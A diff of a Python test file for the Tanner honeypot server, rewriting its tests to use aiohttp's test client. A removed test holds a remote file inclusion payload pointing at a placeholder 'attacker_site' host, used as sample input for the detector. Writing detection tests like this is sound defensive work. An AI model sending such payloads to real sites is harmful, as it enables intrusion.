@@ -1,135 +1,109 @@
 import asyncio
-import json
-import unittest
-from unittest import mock
 import uuid
+from unittest import mock
+
+from aiohttp.test_utils import AioHTTPTestCase, unittest_run_loop
 
 from tanner import server
-from tanner import config
+from tanner.config import TannerConfig
 
 
-class TestServer(unittest.TestCase):
+class TestServer(AioHTTPTestCase):
     def setUp(self):
-        self.loop = asyncio.new_event_loop()
-        asyncio.set_event_loop(None)
         d = dict(MONGO={'enabled': 'False', 'URI': 'mongodb://localhost'},
                  LOCALLOG={'enabled': 'False', 'PATH': '/tmp/tanner_report.json'})
         m = mock.MagicMock()
         m.__getitem__.side_effect = d.__getitem__
         m.__iter__.side_effect = d.__iter__
-        config.TannerConfig.config = m
+        TannerConfig.config = m
 
-        @asyncio.coroutine
-        def choosed(client):
-            return [x for x in range(10)]
-
-        dorks = mock.Mock()
-        attrs = {'extract_path.return_value': (lambda: (yield None))()}
-        dorks.configure_mock(**attrs)
-        dorks.choose_dorks = choosed
-
-        self.MockedRequestHandler = server.HttpRequestHandler
-        self.MockedRequestHandler.redis_client = mock.Mock()
         with mock.patch('tanner.dorks_manager.DorksManager', mock.Mock()):
-            with mock.patch('tanner.emulators.lfi.LfiEmulator', mock.Mock(), create=True):
-                self.handler = self.MockedRequestHandler(loop=self.loop, debug=False, keep_alive=75, base_dir='/tmp/', db_name='test.db')
-
-        self.handler.dorks = dorks
-        self.handler.writer = mock.Mock()
+            with mock.patch('tanner.emulators.base.BaseHandler', mock.Mock(), create=True):
+                with mock.patch('tanner.session_manager.SessionManager', mock.Mock(), create=True):
+                    self.serv = server.TannerServer()
 
         self.test_uuid = uuid.uuid4()
-        @asyncio.coroutine
-        def add_or_update_mock(data, client):
+
+        async def _add_or_update_mock(data, client):
             sess = mock.Mock()
             sess.set_attack_type = mock.Mock()
+            test_uuid = uuid
             sess.get_uuid = mock.Mock(return_value=str(self.test_uuid))
             return sess
 
-        self.handler.session_manager.add_or_update_session = add_or_update_mock
-        # self.handler.dorks = dorks
+        self.serv.session_manager.add_or_update_session = _add_or_update_mock
 
-        self.m = mock.Mock()
-        self.m_eof = mock.Mock()
-        self.m_eof.return_value = (lambda: (yield None))()
+        async def choosed(client):
+            return [x for x in range(10)]
+
+        dorks = mock.Mock()
+        dorks.choose_dorks = choosed
+        dorks.extract_path = self._make_coroutine()
+
+        self.serv.dorks = dorks
+
+        super(TestServer, self).setUp()
+
+    def _make_coroutine(self):
+        async def coroutine(*args, **kwargs):
+            return mock.Mock(*args, **kwargs)
+
+        return coroutine
+
+    def get_app(self):
+        app = self.serv.create_app(loop=self.loop)
+        return app
+
+    @unittest_run_loop
+    async def test_example(self):
+        request = await self.client.request("GET", "/")
+        assert request.status == 200
+        text = await request.text()
+        assert "Tanner server" in text
 
     def test_make_response(self):
         msg = 'test'
-        content = json.loads(self.handler._make_response(msg).decode('utf-8'))
+        content = self.serv._make_response(msg)
         assert_content = dict(version=1, response=dict(message=msg))
         self.assertDictEqual(content, assert_content)
 
-    def test_handle_request_for_dorks(self):
-        with mock.patch('aiohttp.Response.write', self.m, create=True):
-            with mock.patch('aiohttp.Response.write_eof', self.m_eof, create=True):
-                message = mock.Mock()
-                message.headers = []
-                message.path = '/dorks'
-                message.version = (1, 1)
+    @unittest_run_loop
+    async def test_events_request(self):
+        async def _make_handle_coroutine(*args, **kwargs):
+            return {'name': 'index', 'order': 1, "payload": None}
 
-                self.loop.run_until_complete(self.handler.handle_request(message, None))
-                content = b''.join([c[1][0] for c in list(self.m.mock_calls)]).decode('utf-8')
-                content = json.loads(content)
+        detection_assert = {'version': 1, 'response': {
+            'message': {'detection': {'name': 'index', 'order': 1, "payload": None}, 'sess_uuid': str(self.test_uuid)}}}
+        self.serv.base_handler.handle = _make_handle_coroutine
+        request = await self.client.request("POST", "/event", data=b"{\"path\":\"/index.html\"}")
+        assert request.status == 200
+        detection = await request.json()
+        self.assertDictEqual(detection, detection_assert)
 
-            assert_content = dict(version=1, response=dict(dorks=[x for x in range(10)]))
-            self.assertDictEqual(content, assert_content)
+    @unittest_run_loop
+    async def test_dorks_request(self):
+        assert_content = dict(version=1, response=dict(dorks=[x for x in range(10)]))
+        request = await self.client.request("GET", "/dorks")
+        assert request.status == 200
+        detection = await request.json()
+        self.assertDictEqual(detection, assert_content)
 
-    def test_handle_request_rfi(self):
-        rand = mock.Mock()
-        rand.return_value = [x for x in range(10)]
-        self.handler.base_handler.emulators['rfi'].handle = mock.Mock(return_value=(lambda: (yield None))())
+    @unittest_run_loop
+    async def test_api_request(self):
+        assert_content = {"version": 1, "response": {"message": "tanner api"}}
+        request = await self.client.request("GET", "/api")
+        assert request.status == 200
+        detection = await request.json()
+        self.assertDictEqual(detection, assert_content)
 
-        with mock.patch('aiohttp.Response.write', self.m, create=True):
-            with mock.patch('aiohttp.Response.write_eof', self.m_eof, create=True):
-                message = mock.Mock()
-                message.headers = []
-                message.path = '/event'
-                message.version = (1, 1)
+    @unittest_run_loop
+    async def test_stats_api_request(self):
+        async def _make_api_coroutine(*args, **kwargs):
+            return ["1", "2"]
 
-                @asyncio.coroutine
-                def foobar():
-                    return b'{"method":"GET","path":"/vuln_page.php?file=http://attacker_site/malicous_page"}'
-
-                payload = mock.Mock()
-                payload.read = foobar
-
-                self.loop.run_until_complete(self.handler.handle_request(message, payload))
-
-                content = b''.join([c[1][0] for c in list(self.m.mock_calls)]).decode('utf-8')
-                content = json.loads(content)
-
-                assert_content = dict(
-                    version=1,
-                    response=dict(message=dict(detection=dict(name='rfi', order=2, payload=None), sess_uuid=str(self.test_uuid)))
-                )
-
-                self.assertDictEqual(content, assert_content)
-
-    def test_hadle_request_index(self):
-        rand = mock.Mock()
-        rand.return_value = [x for x in range(10)]
-
-        with mock.patch('aiohttp.Response.write', self.m, create=True):
-            with mock.patch('aiohttp.Response.write_eof', self.m_eof, create=True):
-                message = mock.Mock()
-                message.headers = []
-                message.path = '/event'
-                message.version = (1, 1)
-
-                @asyncio.coroutine
-                def foobar():
-                    return b'{"method":"GET","path":"/index.html"}'
-
-                payload = mock.Mock()
-                payload.read = foobar
-
-                self.loop.run_until_complete(self.handler.handle_request(message, payload))
-
-                content = b''.join([c[1][0] for c in list(self.m.mock_calls)]).decode('utf-8')
-                content = json.loads(content)
-
-                assert_content = dict(
-                    version=1,
-                    response=dict(message=dict(detection=dict(name='index', order=1), sess_uuid=str(self.test_uuid)))
-                )
-
-                self.assertDictEqual(content, assert_content)
+        assert_content = {"version": 1, "response": {"message": ["1", "2"]}}
+        self.serv.api.handle_api_request = _make_api_coroutine
+        request = await self.client.request("GET", "/api/stats")
+        assert request.status == 200
+        detection = await request.json()
+        self.assertDictEqual(detection, assert_content)
